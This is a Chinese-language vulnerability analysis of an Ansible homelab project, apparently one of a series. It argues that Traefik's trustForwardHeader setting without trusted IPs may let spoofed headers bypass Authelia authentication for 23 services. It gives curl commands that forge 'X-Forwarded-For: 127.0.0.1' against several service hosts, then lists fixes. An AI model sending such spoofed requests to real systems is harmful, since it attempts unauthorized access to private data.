# Ansible Homelab 项目详细解释

## 这个项目是什么？

### Ansible Homelab 是什么？

**Ansible Homelab** 是一个使用 Ansible 自动化部署家庭实验室（Homelab）的项目。它使用：

1. **Ansible** - 自动化配置管理工具
2. **Docker** - 容器化部署
3. **Traefik** - 反向代理和负载均衡器
4. **Authelia** - 认证和授权服务

### 项目功能

这个项目自动化部署了**23 个服务**，包括：

#### 文件管理服务
- **Nextcloud** - 私有云存储和文件同步
- **Filebrowser** - Web 文件管理器

#### 媒体服务
- **Jellyfin** - 媒体服务器（类似 Plex）
- **Jellyseerr** - 媒体请求管理

#### 下载服务
- **qBittorrent** - BitTorrent 客户端
- **Sonarr** - TV 节目自动下载
- **Radarr** - 电影自动下载
- **Prowlarr** - 索引器管理
- **Requestrr** - Discord 机器人请求管理

#### 开发工具
- **Code Server** - VS Code 在线编辑器
- **n8n** - 工作流自动化工具

#### 监控和管理
- **Grafana** - 监控和可视化
- **Uptime Kuma** - 服务监控
- **Portainer** - Docker 容器管理
- **Heimdall** - 应用仪表板
- **Homarr** - 另一个应用仪表板
- **Dashdot** - 系统监控仪表板

#### 其他服务
- **Vaultwarden** - 密码管理器（Bitwarden 兼容）
- **Guacamole** - 远程桌面网关
- **Duplicati** - 备份工具
- **Syncthing** - 文件同步
- **Unmanic** - 媒体库管理
- **WireGuard** - VPN 服务

### 安全架构

所有服务都通过 **Authelia** 进行认证保护：

```
客户端请求
  ↓
Traefik (反向代理)
  ↓
Forward Auth 中间件
  ↓
Authelia (认证服务)
  ↓
检查用户是否已登录
  ↓
如果未登录 → 重定向到登录页
如果已登录 → 返回 200 OK，允许访问
```

## 为什么这个漏洞严重？

### 1. 影响范围巨大 🔴

**23 个服务受影响**，包括：
- 文件管理服务（Nextcloud, Filebrowser）
- 媒体服务（Jellyfin, Jellyseerr）
- 密码管理（Vaultwarden）
- 监控服务（Grafana, Uptime Kuma）
- 管理工具（Portainer, Heimdall）
- 开发工具（Code Server, n8n）
- 下载服务（qBittorrent, Sonarr, Radarr）

**与之前项目对比**：
- Tailchat: 1 个服务
- CrowdSec: 1 个服务
- **Ansible Homelab: 23 个服务** 🔴

### 2. 数据泄露风险极高 🔴

如果认证被绕过，攻击者可以访问：

#### 敏感数据
- **Nextcloud**: 私有文件、照片、文档
- **Vaultwarden**: 密码库、信用卡信息
- **Jellyfin**: 个人媒体库
- **Grafana**: 系统监控数据、基础设施信息

#### 系统控制
- **Portainer**: 可以管理所有 Docker 容器
- **Code Server**: 可以访问代码和文件系统
- **n8n**: 可以执行自动化工作流

#### 网络访问
- **Guacamole**: 可以访问远程桌面
- **WireGuard**: 可以访问 VPN 网络

### 3. 认证绕过风险 🔴

**Authelia 是一个认证服务**，用于：
- 验证用户身份
- 控制访问权限
- 保护所有服务

如果认证被绕过，意味着：
- **所有 23 个服务都可以被未授权访问**
- **所有敏感数据都可能泄露**
- **整个家庭实验室的安全完全失效**

### 4. 实际伤害场景

**场景 1: 文件泄露**
```
1. 攻击者绕过 Authelia 认证
2. 访问 Nextcloud
3. 下载所有私有文件
4. 🔴 个人隐私完全泄露
```

**场景 2: 密码泄露**
```
1. 攻击者绕过 Authelia 认证
2. 访问 Vaultwarden
3. 导出所有密码
4. 🔴 所有账户密码泄露
```

**场景 3: 系统控制**
```
1. 攻击者绕过 Authelia 认证
2. 访问 Portainer
3. 控制所有 Docker 容器
4. 🔴 整个系统被控制
```

**场景 4: 媒体库访问**
```
1. 攻击者绕过 Authelia 认证
2. 访问 Jellyfin
3. 观看所有媒体内容
4. 🔴 个人媒体库被访问
```

## 如何攻击的？

### 漏洞配置

#### 步骤 1: Traefik Forward Auth 配置

```yaml:157:157:vulnerable_repos_analysis/ansible_homelab/tasks/authelia.yml
      traefik.http.middlewares.authelia.forwardauth.trustForwardHeader: "true"
```

**问题**:
- `trustForwardHeader: true` 表示 Traefik 会信任并转发 `X-Forwarded-For` 头
- **没有配置 `trustedIPs` 白名单**
- 这意味着**任何来源**的 `X-Forwarded-For` 头都会被信任

#### 步骤 2: 受保护的服务配置

所有 23 个服务都使用 `authelia@docker` 中间件：

```yaml
# 示例：Code Server
traefik.http.routers.code-secure.middlewares: "authelia@docker"

# 示例：Jellyfin
traefik.http.routers.jellyfin-secure.middlewares: "authelia@docker"

# 示例：Portainer
traefik.http.routers.portainer-secure.middlewares: "authelia@docker"

# ... 还有 20 个服务
```

### 攻击流程

```
攻击者（未通过 Authelia 认证）
  ↓
发送 HTTP 请求:
  GET / HTTP/1.1
  Host: code.example.com
  X-Forwarded-For: 127.0.0.1  ← 伪造本地 IP
  ↓
Traefik 收到请求
  ↓
检查 Forward Auth 配置: trustForwardHeader: true
  ↓ 信任并转发 X-Forwarded-For
转发到 Authelia Forward Auth:
  X-Forwarded-For: 127.0.0.1
  ↓
Authelia 收到请求
  ↓
如果 Authelia 使用 X-Forwarded-For 进行某些检查：
  - IP 白名单检查
  - 信任本地 IP
  - 其他访问控制
  ↓
如果实现不当，可能绕过认证
  ↓
返回: 200 OK ✅
攻击成功！绕过 Authelia 认证！
  ↓
可以访问所有 23 个服务
```

### 具体攻击命令

#### 步骤 1: 正常访问（未认证）

```bash
# 访问受保护的服务（未登录）
curl https://code.example.com
# 或者
curl https://jellyfin.example.com
curl https://portainer.example.com

# 结果: 401 Unauthorized 或重定向到登录页
# 因为未通过 Authelia 认证
```

#### 步骤 2: 攻击 - 伪造本地 IP

```bash
# 攻击者伪造本地 IP，尝试绕过认证
curl -H "X-Forwarded-For: 127.0.0.1" https://code.example.com
curl -H "X-Forwarded-For: 127.0.0.1" https://jellyfin.example.com
curl -H "X-Forwarded-For: 127.0.0.1" https://portainer.example.com

# 如果 Authelia 实现不当，可能返回: 200 OK ✅
# 攻击成功！绕过 Authelia 认证！
```

#### 步骤 3: 访问所有受保护的服务

```bash
# 一旦绕过认证，可以访问所有 23 个服务
curl -H "X-Forwarded-For: 127.0.0.1" https://nextcloud.example.com
curl -H "X-Forwarded-For: 127.0.0.1" https://vaultwarden.example.com
curl -H "X-Forwarded-For: 127.0.0.1" https://grafana.example.com
# ... 所有 23 个服务
```

### 为什么攻击可能成功？

1. **Traefik 信任所有 X-Forwarded-For**
   - `trustForwardHeader: true` 且没有 `trustedIPs`
   - 任何来源的 `X-Forwarded-For` 都被信任

2. **Authelia 可能使用 X-Forwarded-For**
   - 如果 Authelia 使用 `X-Forwarded-For` 进行访问控制
   - 攻击者可以伪造本地 IP (`127.0.0.1`)
   - 可能绕过某些认证检查

3. **所有服务都受影响**
   - 23 个服务都使用 `authelia@docker` 中间件
   - 如果认证被绕过，所有服务都可以被访问

### 攻击效果

**攻击前**:
- 未认证用户访问
- 结果: 401 Unauthorized 或重定向到登录页
- 状态: ✅ 认证正常工作

**攻击后**:
- 伪造本地 IP 访问
- 结果: 200 OK（如果 Authelia 实现不当）
- 状态: 🔴 认证被绕过
- **可以访问所有 23 个服务**

## 修复方法

### 修复 1: 移除 trustForwardHeader（推荐）

```yaml
# 在 tasks/authelia.yml 中
# 移除这一行
# traefik.http.middlewares.authelia.forwardauth.trustForwardHeader: "true"
```

### 修复 2: 配置 trustedIPs 白名单

在 Traefik 全局配置中添加：

```yaml
# Traefik 配置
entryPoints:
  web:
    forwardedHeaders:
      trustedIPs:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
```

### 修复 3: 确保 Authelia 不使用 X-Forwarded-For

确保 Authelia 配置不使用 `X-Forwarded-For` 进行访问控制。

## 总结

### 这个项目是什么？
- **Ansible Homelab** 是一个自动化部署家庭实验室的项目
- 使用 Ansible 部署 **23 个服务**
- 所有服务都通过 **Authelia** 进行认证保护

### 为什么严重？
1. **影响范围巨大**：23 个服务受影响
2. **数据泄露风险极高**：文件、密码、媒体等敏感数据
3. **认证绕过风险**：如果认证被绕过，所有服务都可以被访问
4. **实际伤害严重**：可能导致个人隐私完全泄露

### 如何攻击？
1. **发送伪造的 X-Forwarded-For 头**（如 `127.0.0.1`）
2. **Traefik 信任并转发**（因为 `trustForwardHeader: true`）
3. **Authelia 可能使用伪造的 IP**（如果实现不当）
4. **绕过认证**（如果 Authelia 信任本地 IP）
5. **访问所有 23 个服务**

**关键**：攻击者只需要在 HTTP 请求中添加一个 `X-Forwarded-For: 127.0.0.1` 头，就可能绕过 Authelia 认证，访问所有 23 个服务！

